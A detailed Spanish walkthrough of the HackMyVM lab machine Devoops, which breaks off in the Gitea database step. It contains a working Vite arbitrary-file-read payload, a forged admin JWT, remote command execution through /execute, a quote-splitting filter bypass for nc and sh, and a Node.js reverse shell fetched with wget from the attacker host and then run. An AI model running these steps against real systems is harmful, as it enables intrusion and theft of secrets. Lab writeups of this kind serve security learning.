# Writeup muy detallado de **Devoops** (HackMyVM)

> Entorno de práctica controlado. Todo lo que se describe aquí debe usarse únicamente dentro del laboratorio autorizado.

## Índice

1. Introducción y contexto
2. Problema al importar la máquina y ajuste de red entre VMware y VirtualBox
3. Preparación del directorio de trabajo
4. Descubrimiento de la IP de la víctima
5. Enumeración inicial de puertos y servicios con Nmap
6. Análisis del servicio web en el puerto 3000
7. Fuzzing de rutas con `ffuf`
8. Identificación de Vite y vulnerabilidad de lectura arbitraria de archivos
9. Explotación de la lectura arbitraria de archivos
10. Análisis de `.env` y del secreto JWT
11. Forja de un JWT administrativo
12. Abuso del endpoint `/execute`
13. Ejecución remota de comandos y obtención de reverse shell
14. Pivoting al usuario `hana` mediante Git e historial de commits
15. Acceso por SSH con la clave privada recuperada
16. Escalada de privilegios a `root`
17. Obtención de flags y cierre
18. Resumen técnico de la cadena de ataque

---

## 1. Introducción y contexto

En esta máquina el objetivo no es solamente “sacar la flag”, sino entender **qué está pasando en cada fase**. La cadena de ataque completa va a girar alrededor de varios conceptos muy importantes:

- Virtualización y modo de red en máquinas virtuales.
- Descubrimiento de hosts en red local.
- Identificación de una VM por el prefijo de su dirección MAC.
- Enumeración de puertos y análisis de servicios.
- Detección de un entorno de desarrollo web con **Vite**.
- Explotación de una vulnerabilidad de **Arbitrary File Read**.
- Exposición de un `.env` con un `JWT_SECRET`.
- Forja de un **JSON Web Token** con privilegios de administrador.
- Uso de un endpoint con ejecución de comandos (`/execute`).
- Bypass conceptual de filtros de comandos.
- Reverse shell en Node.js.
- Pivoting mediante un repositorio Git y commits antiguos.
- Escalada de privilegios con `sudo` sobre `/sbin/arp`.
- Lectura de `/etc/shadow`, crackeo del hash y compromiso final de `root`.

La idea de este writeup es que puedas seguir el razonamiento de principio a fin, sin asumir que ya conoces los conceptos.

---

## 2. Problema al importar la máquina y ajuste de red entre VMware y VirtualBox

La máquina **Devoops** dio problemas al importarla en VMware, por lo que se optó por abrirla con **VirtualBox**. Como la máquina atacante Kali estaba en **VMware** y la víctima en **VirtualBox**, hubo que hacer que ambas quedaran en la **misma red de capa 2**, es decir, en el mismo segmento de red, para que pudieran verse entre sí.

### 2.1. Ajuste en VirtualBox

En VirtualBox se configuró el adaptador de red de la máquina víctima en **modo puente**.

Ruta:

`Configuración > Red > Adaptador 1 > Conectado a: Adaptador puente`

Y se eligió la interfaz:

**MediaTek Wi‑Fi 6 MT7921 Wireless LAN Card**

![Imagen 2 - Adaptador de VirtualBox](./files/imagen2_virtualbox_adapter.png)

### 2.2. ¿Por qué se elige esa interfaz?

Porque esa es la **tarjeta de red física real** del host Windows que en ese momento está conectada a la red doméstica. Dicho de otro modo:

- Tu portátil o PC host tiene varias interfaces posibles: Ethernet, Wi‑Fi, adaptadores virtuales, quizá VPN, etc.
- La que realmente te está dando salida a la red es la **Wi‑Fi MediaTek**.
- Si haces bridge sobre esa interfaz, la máquina virtual ya no usa una red aislada del hipervisor, sino que se conecta “como si fuera otro equipo más” dentro de tu red local.

Eso significa que la VM obtendrá una IP del mismo rango que el resto de dispositivos de casa. Por ejemplo, si tu router está en `192.168.1.1`, es normal que la VM reciba algo como `192.168.1.41`, `192.168.1.44`, etc.

### 2.3. Ajuste equivalente en VMware para Kali

En VMware se hizo exactamente la misma idea: poner la Kali en **bridge** contra la **misma interfaz física**.

Primero:

`Editar > Editor de red virtual > VMnet > En puente > seleccionar la misma tarjeta MediaTek`

![Imagen 3 - Editor de red virtual de VMware](./files/imagen3_vmware_vmnet_bridge.png)

Después, en la configuración concreta de la VM Kali:

`Click derecho sobre Kali > Configuración > Adaptador de red > Conexión en puente`

![Imagen 4 - Adaptador de red en puente en Kali VMware](./files/imagen4_vmware_kali_bridge.png)

### 2.4. ¿Qué efecto tiene esto?

Al poner ambas máquinas en puente sobre la **misma NIC física**, tanto Kali como la víctima quedan expuestas en la **misma red doméstica**. En términos prácticos:

- La red de VMware deja de ser una red privada interna aislada.
- Kali pide IP al router de tu casa, igual que cualquier otro dispositivo.
- VirtualBox hace lo mismo con la VM víctima.
- Ambas máquinas pueden comunicarse directamente porque están en el mismo segmento de red.

### 2.5. Cambio de IP en Kali

Al cambiar el modo de red, Kali pierde durante un momento la conectividad y luego recibe una nueva dirección IP al renovar la configuración.

La comprobación se hizo con:

```bash
ip a
```

Y se observó una dirección como `192.168.1.42/24`.

![Imagen 5 - Nueva IP de Kali tras poner bridge](./files/imagen5_ip_a_kali.png)

### 2.6. ¿Qué significa exactamente `192.168.1.42/24`?

- `192.168.1.42` es la IP de la Kali dentro de la red local.
- `/24` indica la máscara de red `255.255.255.0`.
- Eso significa que el rango de la red es `192.168.1.0 - 192.168.1.255`.
- Los hosts típicos válidos dentro de esa red son `192.168.1.1` a `192.168.1.254`.

---

## 3. Preparación del directorio de trabajo

Como paso organizativo, se creó una carpeta específica para la máquina:

```bash
cd ~/Desktop
mkdir HackMyVM
cd HackMyVM
mkdir Devoops
cd Devoops
```

Esto no tiene impacto ofensivo, pero es importante a nivel práctico porque ayuda a mantener:

- exploits descargados,
- capturas,
- notas,
- hashes,
- ficheros temporales,
- reverse shells,

bien ordenados por máquina.

---

## 4. Descubrimiento de la IP de la víctima

Una vez que Kali y Devoops están en la misma red, el siguiente paso es **averiguar qué IP tiene la máquina víctima**.

Se utilizó:

```bash
sudo nmap -n -sn 192.168.1.42/24
```

### 4.1. Explicación detallada de las flags

- `sudo`: algunas formas de descubrimiento de hosts y envío de paquetes necesitan privilegios elevados.
- `nmap`: herramienta de enumeración de red extremadamente utilizada para descubrir hosts, puertos, servicios y versiones.
- `-n`: le dice a Nmap que **no resuelva DNS**. Es decir, que no intente traducir IPs a nombres. Esto acelera el escaneo y evita ruido innecesario.
- `-sn`: significa **ping scan** o **host discovery only**. Nmap no hará escaneo de puertos; solo comprobará qué equipos están vivos.
- `192.168.1.42/24`: se usa esa red porque la Kali está dentro de ese segmento. En realidad, el bloque `/24` representa toda la red `192.168.1.0/24`.

### 4.2. ¿Qué devuelve este comando?

Devuelve qué hosts están activos en esa red local. En tu caso apareció algo así:

```text
Nmap scan report for 192.168.1.1
Host is up
...
Nmap scan report for 192.168.1.41
Host is up
MAC Address: 08:00:27:60:E8:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
Nmap scan report for 192.168.1.42
Host is up.
```

### 4.3. ¿Por qué salen muchas IPs y no solo la víctima?

Porque ahora estás escaneando la **red física real** a la que estás conectado, no una red privada de VMware.

Eso implica que Nmap ve:

- el router,
- el móvil,
- otros portátiles,
- televisiones,
- dispositivos IoT,
- tu propia Kali,
- y también la víctima en VirtualBox.

Antes, si Kali estaba en una red privada de VMware, solo veías las máquinas virtuales que compartían esa red interna. Ahora no: ahora ves toda la red doméstica.

### 4.4. Identificación de la víctima usando la MAC

La pista clave fue esta línea:

```text
MAC Address: 08:00:27:60:E8:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

### 4.5. ¿Qué es una dirección MAC?

Una MAC es una dirección de capa 2, asociada a una interfaz de red. Tiene este formato:

```text
08:00:27:60:E8:0C
```

Está compuesta por 6 bytes. Los **primeros 3 bytes** son especialmente importantes y se denominan **OUI**.

### 4.6. ¿Qué es el OUI?

**OUI** significa **Organizationally Unique Identifier**.

Es el prefijo que identifica al fabricante del adaptador de red. Ejemplos:

- `08:00:27` → VirtualBox
- `00:0C:29` → VMware
- `48:E7:DA` → AzureWave
- `3C:BD:3E` → Xiaomi
- `A4:43:8C` → Arris

Por tanto, si sabes que la víctima la levantaste en VirtualBox, el host cuya MAC empieza por `08:00:27` es una pista muy fuerte de que esa es la máquina objetivo.

### 4.7. Conclusión del descubrimiento

La víctima se identificó como:

```text
192.168.1.41
```

porque:

- aparece viva,
- tiene MAC de VirtualBox,
- y coincide con cómo fue desplegada la máquina.

---

## 5. Enumeración inicial de puertos y servicios con Nmap

Una vez identificada la IP de la víctima, el siguiente paso es enumerar puertos y servicios:

```bash
sudo nmap -p- --open -sCV -Pn -T5 -vvv -oN fullscan 192.168.1.41
```

### 5.1. Explicación de cada flag

- `-p-`: escanea **todos los puertos TCP**, del 1 al 65535.
- `--open`: muestra solo puertos abiertos o potencialmente útiles. Evita mucho ruido.
- `-sC`: ejecuta los **scripts por defecto de NSE** (Nmap Scripting Engine). Sirve para sacar información adicional útil.
- `-sV`: intenta identificar la **versión del servicio** que corre en cada puerto.
- `-Pn`: le dice a Nmap que no haga la fase de descubrimiento previa y asuma que el host está activo.
- `-T5`: plantilla de temporización muy agresiva. Va más rápido, pero puede ser menos sigilosa o más propensa a perder algo en redes inestables.
- `-vvv`: modo muy verboso. Muestra mucho detalle en pantalla.
- `-oN fullscan`: guarda la salida en formato normal dentro del archivo `fullscan`.

### 5.2. Resultado relevante

El hallazgo principal fue:

```text
3000/tcp open  ppp?
```

y una serie de respuestas HTTP muy reveladoras.

### 5.3. ¿Por qué `SERVICE: ppp?` no significa realmente que sea PPP?

Nmap está haciendo una **suposición**. A veces no reconoce un servicio exactamente y coloca una conjetura. Lo importante no es la etiqueta tentativa, sino el contenido de las respuestas que obtuvo.

### 5.4. Importancia del TTL

Se observó `ttl 64`, lo cual suele sugerir Linux. No es una prueba absoluta, pero sí una pista razonable.

### 5.5. Lo importante: `fingerprint-strings`

Nmap mostró respuestas como:

```text
HTTP/1.1 403 Forbidden
Blocked request. This host (undefined) is not allowed.
allow this host, add undefined to `server.allowedHosts` in vite.config.js.
```

Eso es oro puro a nivel de enumeración.

### 5.6. ¿Por qué esto apunta a Vite?

Porque el propio mensaje menciona:

```text
vite.config.js
```

Vite es una herramienta moderna de desarrollo frontend. Se usa mucho con proyectos de:

- Vue,
- React,
- TypeScript,
- JavaScript moderno,
- y, en general, flujos de desarrollo web donde se necesita un servidor muy rápido para recargar cambios.

### 5.7. ¿Qué es `allowedHosts`?

Es una medida de control de acceso del servidor de desarrollo. En pocas palabras, el servidor comprueba el valor del **Host header** de la petición y solo permite ciertos nombres o dominios.

Esto existe para impedir que un servidor de desarrollo quede expuesto accidentalmente a peticiones externas no previstas.

Cuando el mensaje dice:

```text
Blocked request. This host (undefined) is not allowed.
```

está indicando que:

- la petición llegó,
- el servidor la entendió,
- pero la bloqueó por la política de hosts permitidos.

### 5.8. ¿Por qué esto sugiere un entorno de desarrollo y no producción?

Porque Vite, sobre todo en este contexto, suele estar pensado como **servidor de desarrollo**. En producción lo habitual es compilar la aplicación y servir ficheros estáticos con Nginx, Apache o un backend preparado para ello.

Que una máquina exponga un servidor Vite al exterior es una mala práctica bastante típica de un entorno de desarrollo o de una configuración descuidada.

### 5.9. El `204 No Content`

También apareció una respuesta tipo:

```text
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
```

Eso indica que la aplicación probablemente soporta varios métodos HTTP y, de nuevo, refuerza la idea de que estamos ante una aplicación web moderna con backend o API asociada.

### 5.10. Conclusión de esta fase

Hasta aquí ya sabemos lo suficiente como para guiar el resto del ataque:

- la víctima parece Linux,
- hay un servicio web en el puerto 3000,
- el servicio está relacionado con Vite,
- muy probablemente es un entorno de desarrollo,
- y la superficie de ataque será web.

---

## 6. Análisis del servicio web en el puerto 3000

Se accedió a:

```text
http://192.168.1.41:3000/
```

La aplicación mostraba algo relacionado con:

**Creating a Vue.js + Express.js Project**

Eso cuadra completamente con lo observado antes:

- Vue.js como frontend,
- Express.js como backend o servidor Node,
- y Vite como entorno de desarrollo.

### 6.1. Ver código fuente con `CTRL + U`

Se revisó el código fuente básico y, en un primer momento, no parecía haber nada especialmente sensible. Esto es normal: el HTML inicial puede no contener secretos.

Pero sí apareció una referencia interesante al cliente de Vite:

```html
<script type="module" src="/@vite/client"></script>
```

Ese recurso iba a ser importante después.

---

## 7. Fuzzing de rutas con `ffuf`

Se hizo fuzzing de contenido web con:

```bash
ffuf -u http://192.168.1.41:3000/FUZZ -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100
```

### 7.1. Explicación de las flags

- `ffuf`: herramienta de fuzzing web muy usada para descubrir rutas, ficheros, parámetros, vhosts, etc.
- `-u`: URL objetivo. `FUZZ` es el marcador que `ffuf` irá reemplazando por cada palabra del diccionario.
- `-c`: salida coloreada para facilitar lectura.
- `-w`: ruta al wordlist.
- `-t 100`: usa 100 hilos concurrentes. Acelera el proceso.

### 7.2. Problema: demasiado ruido

Aparecían demasiadas respuestas aparentemente válidas, muchas con el mismo tamaño. Eso suele significar que la aplicación devuelve una página similar para rutas inexistentes o no útiles.

En este caso, muchas devolvían tamaño `414`.

### 7.3. Filtrado por tamaño

Se repitió el fuzzing filtrando ese tamaño:

```bash
ffuf -u http://192.168.1.41:3000/FUZZ -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 --fs 414
```

### 7.4. Explicación de `--fs`

- `--fs 414`: **filter size**. Le dice a `ffuf` que descarte todas las respuestas cuyo tamaño sea 414 bytes.

Con eso se limpiaron muchos falsos positivos.

### 7.5. Rutas interesantes encontradas

Los hallazgos fueron:

```text
/server   [Status: 200]
/sign     [Status: 200]
/execute  [Status: 401]
```

### 7.6. Interpretación

- `/server`: probablemente expone código o información del servidor.
- `/sign`: parece algún endpoint que emite un token.
- `/execute`: parece un endpoint sensible. El `401 Unauthorized` ya lo hace extremadamente interesante, porque indica que existe y que requiere autenticación.

---

## 8. Identificación de Vite y vulnerabilidad de lectura arbitraria de archivos

Se revisó el recurso:

```text
/@vite/client
```

Desde el código fuente o directamente en el navegador. Ahí se pudo inferir la versión de Vite, que era:

```text
vite@6.2.0
```

### 8.1. ¿Por qué es importante la versión?

Porque una vez conoces versión concreta, puedes buscar vulnerabilidades públicas que afecten exactamente a esa rama.

### 8.2. Uso de `searchsploit`

Se buscó:

```bash
searchsploit vite
```

#### ¿Qué es Searchsploit?

`searchsploit` es una herramienta de Kali que permite consultar desde terminal la base de datos local de **Exploit-DB**. Sirve para:

- buscar exploits conocidos,
- localizar pruebas de concepto,
- copiar esos scripts a tu carpeta de trabajo,
- revisar rápidamente CVEs y referencias.

Apareció una vulnerabilidad relacionada:

```text
Vite 6.2.2 - Arbitrary File Read
Path: /usr/share/exploitdb/exploits/multiple/remote/52111.py
CVE-2025-30208
```

### 8.3. Razonamiento

Si la vulnerabilidad afecta a versiones anteriores a ciertos parches, y nuestra máquina usa `6.2.0`, es razonable probarla.

### 8.4. Copia del exploit a la carpeta actual

Se hizo:

```bash
searchsploit -m multiple/remote/52111.py
```

#### Explicación de `-m`

- `-m` significa **mirror**. Copia el exploit desde la base local de Exploit-DB a tu directorio actual para poder editarlo y ejecutarlo.

El archivo quedó como:

```text
52111.py
```

### 8.5. Qué decía la descripción de la vulnerabilidad

La vulnerabilidad explicaba algo muy importante:

- Vite usa una ruta especial `@fs` para controlar accesos a archivos del sistema.
- En ciertas versiones se podía **evadir la restricción** añadiendo sufijos como `?raw??` o `?import&raw??`.
- Eso permitía leer archivos arbitrarios si existían.

### 8.6. ¿Qué significa “Arbitrary File Read”?

Significa que, sin necesidad de tener acceso shell todavía, un atacante puede pedirle a la aplicación que le devuelva el contenido de archivos del sistema, por ejemplo:

- `/etc/passwd`
- `.env`
- ficheros de configuración
- claves privadas
- bases de datos
- código fuente

No es ejecución de comandos, pero puede dar material suficiente para comprometer todo el sistema.

---

## 9. Explotación de la lectura arbitraria de archivos

### 9.1. Detalle importante: el exploit venía mal ajustado

El script de Searchsploit probaba algo como:

```python
url = f"{target}{file_path}?raw"
```

Pero en esta máquina la variante funcional era:

```python
url = f"{target}{file_path}?raw??"
```

Ese matiz es importante por dos razones:

1. **No hay que ejecutar exploits a ciegas**.
2. Hay que leerlos y entender qué hacen.

### 9.2. Prueba manual con `/etc/passwd`

Al acceder a una ruta de archivo con el sufijo correcto, se consiguió leer:

```text
/etc/passwd?raw??
```

Y el servidor devolvió el contenido del archivo encapsulado como módulo exportado:

```text
export default "root:x:0:0:root:/root:/bin/sh\n..."
```

### 9.3. ¿Qué es `/etc/passwd`?

Es un archivo clásico de Unix/Linux donde aparecen cuentas del sistema. No contiene las contraseñas en claro, pero sí:

- nombre de usuario,
- UID,
- GID,
- directorio home,
- shell por defecto.

En este caso aparecieron usuarios interesantes como:

- `runner`
- `hana`
- `gitea`

### 9.4. Importancia de `hana`

Que exista `hana` con home en `/home/hana` es una pista muy buena de que ese usuario puede ser relevante en fases posteriores del ataque.

---

## 10. Fuzzing de archivos sensibles usando la vulnerabilidad

Se usó `ffuf` sobre la propia primitive de lectura arbitraria:

```bash
ffuf -u 'http://192.168.1.41:3000/FUZZ?raw??' -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --fs 414 --fc 500
```

### 10.1. Explicación de las flags nuevas

- `--fc 500`: **filter status code**. Filtra respuestas HTTP 500.

Aquí el enfoque cambia: ya no buscas directorios web normales, sino nombres de archivos interesantes directamente a través de la vulnerabilidad.

### 10.2. Resultados

```text
.env         [Status: 200]
etc/passwd   [Status: 200]
etc/hosts    [Status: 200]
README.md    [Status: 200]
package.json [Status: 403]
```

### 10.3. El archivo `.env`

Este fue el hallazgo más importante. Se leyó en:

```text
http://192.168.1.41:3000/.env?raw??
```

y devolvió:

```text
JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'
COMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'
```

### 10.4. ¿Qué es un `.env`?

Es un archivo usado por muchas aplicaciones para guardar variables de entorno. Suele contener:

- secretos,
- tokens,
- claves de API,
- credenciales de base de datos,
- configuraciones de seguridad,
- flags de entorno.

El motivo por el que se usa es separar secretos del código fuente. El problema aquí es que, aunque la idea era buena, el archivo quedó expuesto por la vulnerabilidad.

### 10.5. Importancia de `JWT_SECRET`

Ese valor es la clave secreta con la que el servidor **firma y valida los JWT**. Si un atacante conoce ese secreto, puede crear tokens aparentemente legítimos.

### 10.6. Importancia de `COMMAND_FILTER`

Esta variable nos adelanta que existe algún mecanismo que filtra comandos peligrosos. Eso será clave cuando queramos abusar del endpoint `/execute`.

La blacklist era:

```text
nc, python, python3, py, py3, bash, sh, ash, |, &, <, >, ls, cat, pwd, head, tail, grep, xxd
```

Eso significa que el desarrollador intentó bloquear comandos habituales de explotación y de inspección del sistema.

---

## 11. Análisis del endpoint `/sign` y de los JWT

El endpoint `/sign` devolvía un token como este:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NzM3ODI1NTksImV4cCI6MTc3Mzc4NDM1OX0.C-tmjfY19_7RuPJsUGZZkjY3H-PQwI4w2BXrS7aW1Yw
```

### 11.1. ¿Qué es un JWT?

**JWT** significa **JSON Web Token**.

Es un token que normalmente tiene tres partes separadas por puntos:

1. **Header**: indica el tipo y algoritmo.
2. **Payload**: contiene los datos o claims.
3. **Signature**: firma criptográfica para que el servidor compruebe que el token no ha sido manipulado.

### 11.2. Decodificación del token

Al decodificarlo se vio:

**Header**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload**

```json
{
  "uid": -1,
  "role": "guest",
  "iat": 1773782559,
  "exp": 1773784359
}
```

### 11.3. Qué nos interesa del payload

Los campos verdaderamente interesantes eran:

- `uid`
- `role`

Porque probablemente son los que el backend usa para decidir permisos.

### 11.4. ¿Qué significa `HS256`?

Es un algoritmo de firma HMAC con SHA-256. En este esquema:

- el servidor comparte un secreto simétrico,
- usa ese secreto para firmar el token,
- y luego usa el mismo secreto para verificarlo.

Por tanto, si robas el secreto, puedes firmar tokens válidos.

---

## 12. Forja de un JWT administrativo

Con el `JWT_SECRET` expuesto, se pudo forjar un token manualmente.

Se tomó como base el token de invitado, pero se modificó el payload para dejarlo como administrador:

```json
{
  "uid": 1,
  "role": "admin"
}
```

Se eliminaron `iat` y `exp` porque, en este caso, el backend seguía aceptando el token sin esos campos.

El resultado fue un token válido similar a:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY
```

### 12.1. ¿Por qué funciona esto?

Porque el servidor no tiene forma de distinguir si ese token lo creó él o lo creó un atacante, siempre que:

- el formato sea correcto,
- el algoritmo sea correcto,
- y la firma sea válida con el secreto real.

Si además la lógica del backend confía en `role=admin`, ya has falsificado tu identidad con privilegios elevados.

---

## 13. Reconfirmación de endpoints y localización del punto de ejecución

Se repitió fuzzing de rutas:

```bash
ffuf -u 'http://192.168.1.41:3000/FUZZ' -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --fs 414 --fc 500
```

El endpoint que destacaba era:

```text
/execute [Status: 401]
```

Eso ya sugería claramente:

- el endpoint existe,
- necesita autenticación,
- y puede ser el punto desde el que la aplicación ejecuta acciones privilegiadas.

---

## 14. Uso de `Authorization: Bearer ...` en `/execute`

Se interceptó una petición a `/execute` con Burp Suite y se añadió una cabecera como esta:

```http
Authorization: Bearer <JWT_ADMIN>
```

### 14.1. ¿Por qué tiene que ser exactamente así?

Porque en HTTP la autenticación por token suele enviarse en el header `Authorization` con el esquema **Bearer**.

La sintaxis general es:

```http
Authorization: Bearer token_aqui
```

### 14.2. ¿Qué significa Bearer?

“Bearer” significa, en esencia: **quien porta este token queda autenticado**.

No hace falta usuario y contraseña en cada petición. El servidor simplemente:

1. lee el header,
2. extrae el token,
3. verifica la firma,
4. mira los claims,
5. decide permisos.

Si tu token dice `role=admin` y la firma cuadra con el secreto legítimo, el servidor puede aceptar que eres administrador.

### 14.3. Cambio de comportamiento del endpoint

Sin token válido, la respuesta era tipo:

```json
{"status":"rejected","data":"permission denied"}
```

Con el token forjado pasó a devolver:

```json
{"status":"rejected","data":"this command is unsafe"}
```

Esto es una prueba muy buena de que:

- la autenticación ya funciona,
- el token es válido,
- y ahora el rechazo ya no es por permisos, sino por el contenido del comando.

Eso significa que hemos pasado la barrera de autenticación y estamos peleando ahora contra una capa posterior: el filtro de comandos.

---

## 15. Ejecución remota de comandos con `/execute`

Se probó con un comando inocuo:

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY" "http://192.168.1.41:3000/execute?cmd=id"
```

### 15.1. Explicación detallada del comando

- `curl`: cliente HTTP desde consola.
- `-H`: añade un header personalizado a la petición.
- `Authorization: Bearer ...`: envía el JWT para autenticarse.
- la URL: invoca el endpoint `/execute`.
- `?cmd=id`: pasa como parámetro el comando a ejecutar en el sistema remoto.

### 15.2. ¿Qué hace `id`?

El comando `id` en Linux muestra información de identidad del usuario actual:

- UID,
- GID,
- grupos.

### 15.3. Respuesta obtenida

```json
{"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner) groups=1000(runner)\n","stderr":""}}
```

### 15.4. Interpretación

Esto confirma un **RCE**.

**RCE** significa **Remote Command Execution**, es decir, ejecución remota de comandos. La aplicación está ejecutando comandos del sistema operativo por nosotros y devolviéndonos el resultado.

Además, sabemos que el contexto de ejecución es el usuario:

```text
runner
```

Ese dato es muy importante porque determina:

- qué ficheros podremos leer,
- a qué directorios podremos entrar,
- qué procesos o credenciales podemos aprovechar después.

---

## 16. Sobre la blacklist y el bypass conceptual

La aplicación tenía este filtro:

```text
COMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'
```

### 16.1. ¿Qué está intentando hacer el desarrollador?

Está intentando impedir que un atacante ejecute:

- reverse shells típicas,
- intérpretes comunes,
- comandos de reconocimiento,
- pipes y redirecciones.

Es una **blacklist**.

### 16.2. ¿Por qué las blacklists suelen ser débiles?

Porque intentan enumerar lo malo, y en sistemas reales siempre hay:

- otra utilidad equivalente,
- otra sintaxis,
- otra forma de escribir el mismo comando,
- otra capa de interpretación,
- espacios o comillas que reconstruyen la cadena.

### 16.3. Ejemplo conceptual del bypass con comillas

Se comentó una técnica tipo:

```text
n""c 192.168.1.42 5555 -e s""h
```

La idea es esta:

- el filtro busca la cadena literal `nc` o `sh`,
- pero si tú la troceas, el filtro puede no verla tal cual,
- mientras que el intérprete del shell sí reconstruye el resultado final.

No siempre funcionará en todas las aplicaciones, pero conceptualmente demuestra por qué validar texto crudo con listas negras es mala defensa.

---

## 17. Preparación de una reverse shell en Node.js

Como `bash`, `sh`, `python` y `nc` estaban filtrados, se buscó una alternativa compatible con el stack del servidor.

Dado que la aplicación corre sobre Node.js, se eligió una reverse shell en **Node.js**.

### 17.1. Configuración de la reverse shell

Se generó una reverse shell con IP de Kali `192.168.1.42` y puerto `5555`.

![Imagen 6 - Configuración de la reverse shell](./files/imagen6_revshell_config.png)

El payload fue algo equivalente a:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(5555, "192.168.1.42", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

### 17.2. ¿Por qué esta reverse shell evita el filtro inicial?

Porque el filtro estaba revisando el texto del comando que nosotros mandábamos a `/execute`. En lugar de meter una línea larga con todo el payload inline, se hizo esto:

1. subir un archivo `shell.js`,
2. descargárselo a la víctima,
3. ejecutarlo con `node /tmp/shell.js`.

Así delegas gran parte de la lógica maliciosa a un fichero ya alojado y minimizas la complejidad del comando enviado.

---

## 18. Servir el payload desde Kali

Se creó el fichero:

```bash
nano shell.js
```

Y se levantó un servidor HTTP simple:

```bash
python3 -m http.server 80
```

### 18.1. ¿Qué hace este comando?

- `python3`: invoca Python 3.
- `-m http.server`: ejecuta el módulo integrado `http.server` como servidor web rápido.
- `80`: escucha en el puerto 80.

El efecto práctico es que cualquier archivo del directorio actual puede descargarse desde la víctima usando HTTP.

Por ejemplo:

```text
http://192.168.1.42/shell.js
```

---

## 19. Descarga remota del payload en la víctima

Luego se ordenó a la víctima descargar el fichero:

```bash
curl -H "Authorization: Bearer <JWT_ADMIN>" "http://192.168.1.41:3000/execute?cmd=wget+http://192.168.1.42:80/shell.js+-O+/tmp/shell.js"
```

### 19.1. Explicación exacta de `wget ... -O /tmp/shell.js`

Vamos por partes.

El comando remoto real que se está enviando es:

```bash
wget http://192.168.1.42:80/shell.js -O /tmp/shell.js
```

#### ¿Qué hace `wget`?

`wget` es una utilidad de descarga por línea de comandos. Sirve para obtener recursos desde una URL.

#### ¿Qué significa la URL?

```text
http://192.168.1.42:80/shell.js
```

Significa:

- protocolo: `http`
- host: `192.168.1.42` (tu Kali)
- puerto: `80`
- recurso: `/shell.js`

Es decir, la víctima está conectándose a tu Kali para bajar el fichero.

#### ¿Qué significa `-O /tmp/shell.js`?

La opción `-O` en `wget` significa **Output document**. Le estás diciendo a `wget`:

> “No guardes el archivo con el nombre por defecto. Guárdalo exactamente en esta ruta.”

En este caso:

```text
/tmp/shell.js
```

Por tanto, el efecto exacto es:

> “Descarga `shell.js` desde mi Kali y guárdalo en la carpeta `/tmp` de la víctima con el nombre `shell.js`.”

### 19.2. ¿Por qué `/tmp`?

Porque `/tmp` suele ser:

- escribible por usuarios normales,
- temporal,
- accesible sin privilegios especiales,
- y muy habitual para dejar payloads de explotación.

### 19.3. ¿Por qué aparecen `+` en la URL?

Porque dentro de una query string HTTP los espacios suelen representarse así o quedan codificados. En la práctica:

```text
wget+http://...+-O+/tmp/shell.js
```

se interpreta como:

```text
wget http://... -O /tmp/shell.js
```

### 19.4. ¿Por qué el resultado sale en `stderr` y aun así fue bien?

Muchas utilidades como `wget` escriben información de progreso en la salida de error estándar (`stderr`) aunque la operación haya sido exitosa. No significa necesariamente fallo.

Aquí la prueba de éxito fue:

```text
'/tmp/shell.js' saved
```

---

## 20. Escucha en Kali y ejecución del payload

Primero se dejó un listener en la Kali:

```bash
penelope -p 5555
```

Luego se ejecutó el script remoto:

```bash
curl -H "Authorization: Bearer <JWT_ADMIN>" "http://192.168.1.41:3000/execute?cmd=node+/tmp/shell.js"
```

### 20.1. ¿Qué hace `node /tmp/shell.js`?

`node` ejecuta el archivo JavaScript en el runtime de Node.js. Es decir:

- abre el archivo,
- lo interpreta,
- y ejecuta el código que contiene.

En este caso, ese código abre una conexión saliente hacia tu Kali en el puerto 5555.

### 20.2. Resultado

Se obtuvo una shell como el usuario:

```bash
whoami
runner
```

Ya había acceso interactivo en la máquina.

---

## 21. Exploración local como `runner`

Desde la shell se observó que el proyecto estaba en `/opt/node` y también existía una instalación relacionada con Gitea en `/opt/gitea`.

Esto es muy interesante porque muchas veces los entornos de desarrollo dejan:

- repos bare,
- bases de datos,
- logs,
- credenciales,
- secretos viejos en commits.

### 21.1. Estructura vista

```bash
/opt
├── gitea
└── node
```

Dentro de `/opt/gitea/git/hana/` apareció:

```text
node.git
```

### 21.2. ¿Qué significa `node.git`?

Eso es un repositorio Git, probablemente bare, alojado por Gitea. Muy posiblemente contiene el histórico del proyecto.

Y eso importa muchísimo porque en Git no solo existe el estado actual del código: también existen versiones anteriores, commits borrados, secretos que alguien subió y luego “quitó”, etc.

---

## 22. Base de datos de Gitea y descubrimiento de commits relevantes

También se encontró:

```text
/opt/gitea/db/gitea.db
```

Se revisó con:

```bash
strings gitea.db | grep -A 5 "hana"
```

### 22.1. Explicación detallada de ese comando

- `strings gitea.db`: extrae secuencias de texto legibles de un archivo binario. Aunque SQLite es binario, muchas cadenas internas quedan visibles así.
- `|`: pipe. Envía la salida del primer comando al segundo.
